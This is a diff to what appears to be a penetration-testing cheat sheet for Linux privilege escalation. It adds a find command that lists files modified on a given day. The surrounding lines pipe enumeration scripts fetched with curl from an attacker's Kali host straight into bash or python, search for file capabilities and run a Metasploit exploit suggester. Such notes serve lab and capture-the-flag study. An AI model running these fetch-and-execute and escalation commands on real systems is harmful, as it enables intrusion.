@@ -19,6 +19,7 @@
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
 * `curl {kali_ip}:{port}/linuxprivchecker.py | python` _Run linux priv checker without dropping it on disk_
 * `/sbin/getcap -r / 2>/dev/null` _Search filesytem for files with special capabilities.  Similar to suid_
+* `find / -type f -name "*" -newermt 2018-09-07 ! -newermt 2018-09-08 2>/dev/null` _Find all files modified on a particular day.  Maybe same day as user flag. example show sep 7 2018_
 
 ## Pric Esc Generic
 * `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_
